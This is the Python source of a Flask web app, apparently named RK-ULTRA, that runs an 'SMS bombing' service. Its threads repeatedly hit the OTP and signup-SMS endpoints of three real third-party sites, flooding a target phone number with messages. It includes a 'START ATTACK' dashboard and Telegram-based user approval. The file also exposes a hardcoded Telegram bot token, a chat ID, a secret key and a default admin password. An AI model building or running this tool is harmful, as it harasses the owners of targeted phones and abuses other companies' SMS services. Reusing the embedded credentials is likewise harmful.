import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_ULTRA_SaaS_FINAL_V13_SECURE"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
RENDER_URL = "https://rk-bomb.onrender.com" 
ADMIN_USERNAME = "admin"

# API ENDPOINTS
ILYN_URL = "https://api.ilyn.global/auth/signup"
SHOP_URL = "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber="
SIM_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
BOUNDARY = "----WebKitFormBoundaryRKSTAR12345"

# ---------- DATABASE CONNECTION ----------
def get_db():
    # রেন্ডার সার্ভারের জন্য ডাইনামিক পাথ
    db_path = os.path.join(os.getcwd(), 'system.db')
    conn = sqlite3.connect(db_path, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS history 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, success INTEGER, total INTEGER, status TEXT)''')
    try:
        # Default Admin (Password: admin123)
        hashed_pw = generate_password_hash("admin123")
        conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, ?, ?)", 
                     (ADMIN_USERNAME, hashed_pw, "admin", "approved"))
        conn.commit()
    except:
        pass
    finally:
        conn.close()

init_db()

# ---------- AUTO WAKEUP ----------
def auto_wakeup():
    while True:
        try:
            requests.get(RENDER_URL, timeout=10)
        except:
            pass
        time.sleep(600)

# ---------- BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            conn = get_db()
            conn.execute("INSERT INTO history (username, phone, success, total, status) VALUES (?,?,?,?,?)",
                         (username, phone, active_sessions[key]['success'], active_sessions[key]['total'], "completed"))
            conn.commit()
            conn.close()
            del active_sessions[key]
            break
            
        if active_sessions[key]['status'] == 'running':
            try:
                # 1. ILYN API
                p_json = json.dumps({"code": "BD", "number": phone}, separators=(",", ":"))
                enc = MultipartEncoder(fields={"phone": p_json, "provider": "sms"}, boundary=BOUNDARY)
                r1 = requests.post(ILYN_URL, headers={"Content-Type": enc.content_type}, data=enc, timeout=5)
                if r1.status_code == 200: active_sessions[key]['success'] += 1
                active_sessions[key]['total'] += 1

                # 2. SHOP & SIM API
                requests.get(SHOP_URL + phone, timeout=5)
                requests.post(SIM_URL, json={"msisdn": phone}, timeout=5)
                active_sessions[key]['total'] += 2
            except: 
                pass
            time.sleep(1)
        else:
            time.sleep(2)

# ---------- TELEGRAM WEBHOOK ----------
@app.route('/tg_webhook', methods=['POST'])
def tg_webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        action, target = cb["data"].split('_')
        status = "approved" if action == "approve" else "banned"
        
        conn = get_db()
        conn.execute("UPDATE users SET status = ? WHERE username = ?", (status, target))
        conn.commit()
        conn.close()
        
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/editMessageText", 
                      json={"chat_id": MY_CHAT_ID, "message_id": cb["message"]["message_id"], 
                            "text": f"✅ RK-SYSTEM: {target} is now {status.upper()}!"})
    return "OK"

# ---------- UI & ROUTES ----------
HTML_BASE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RK-ULTRA SaaS</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; padding: 0; }
        .navbar { background: #111; padding: 15px; border-bottom: 1px solid #0f0; text-align: center; }
        .container { padding: 20px; max-width: 500px; margin: auto; }
        .card { background: #0a0a0a; border: 1px solid #222; padding: 20px; border-radius: 10px; border-left: 5px solid #0f0; margin-bottom: 20px; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #0f0; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
        .logout { color: red; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="navbar">
        <b style="color:cyan;">★ RK-ULTRA SYSTEM ★</b><br>
        {% if session.get('user') %}<a href="/logout" class="logout">LOGOUT</a>{% endif %}
    </div>
    <div class="container">
        {% block content %}{% endblock %}
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    if 'user' in session: return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user, pwd = request.form.get('u'), request.form.get('p')
        conn = get_db()
        res = conn.execute("SELECT password, status FROM users WHERE username = ?", (user,)).fetchone()
        conn.close()
        if res and check_password_hash(res['password'], pwd):
            if res['status'] == 'approved':
                session['user'] = user
                return redirect(url_for('dashboard'))
            return "<h2>Access Pending or Banned!</h2>"
        return "<h2>Invalid Login!</h2>"
    return render_template_string(HTML_BASE.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h3>LOGIN</h3>
        <form method="POST">
            <input name="u" placeholder="Username" required>
            <input name="p" type="password" placeholder="Password" required>
            <button>LOGIN</button>
        </form>
        <p>New user? <a href="/register" style="color:cyan;">Register Here</a></p>
    </div>
    '''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        user, pwd = request.form.get('u'), generate_password_hash(request.form.get('p'))
        try:
            conn = get_db()
            conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'user', 'pending')", (user, pwd))
            conn.commit()
            conn.close()
            # Telegram Notification
            btn = {"inline_keyboard": [[{"text": "✅ Approve", "callback_data": f"approve_{user}"}, {"text": "🚫 Ban", "callback_data": f"ban_{user}"}]]}
            requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", json={"chat_id": MY_CHAT_ID, "text": f"🔔 New Registration: {user}", "reply_markup": btn})
            return "<h2>Success! Wait for Admin Approval.</h2>"
        except: return "<h2>Username already taken!</h2>"
    return render_template_string(HTML_BASE.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h3>REGISTER</h3>
        <form method="POST">
            <input name="u" placeholder="New Username" required>
            <input name="p" type="password" placeholder="New Password" required>
            <button>REGISTER</button>
        </form>
        <p><a href="/login" style="color:cyan;">Back to Login</a></p>
    </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(HTML_BASE + '''
    {% block content %}
    <div class="card">
        <h3>START ATTACK</h3>
        <form action="/api/start">
            <input name="num" placeholder="Target (01...)" required>
            <input name="amt" type="number" placeholder="Amount (4-100K)" required>
            <button>FIRE NOW</button>
        </form>
    </div>
    <div id="status"></div>
    <script>
        setInterval(() => {
            fetch('/api/my_sessions').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    html += `<div class="card"><b>📱 ${s.phone}</b> [${s.total}/${s.limit}]<br>
                    <button onclick="location.href='/api/stop?num=${s.phone}'" style="background:red; color:#fff;">STOP</button></div>`;
                }
                document.getElementById('status').innerHTML = html;
            });
        }, 2000);
    </script>
    {% endblock %}
    ''')

@app.route('/api/start')
def start_api():
    u, num, amt = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0))
    if u and num and amt >= 4:
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'status': 'running', 'success': 0, 'total': 0, 'limit': amt}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/my_sessions')
def my_sessions():
    return jsonify({k:v for k,v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/api/stop')
def stop_api():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    # Start Keep-Alive thread
    threading.Thread(target=auto_wakeup, daemon=True).start()
    # Set Webhook
    try: requests.get(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/setWebhook?url={RENDER_URL}/tg_webhook")
    except: pass
    
    port = int(os.environ.get("PORT", 10100))
    app.run(host='0.0.0.0', port=port)
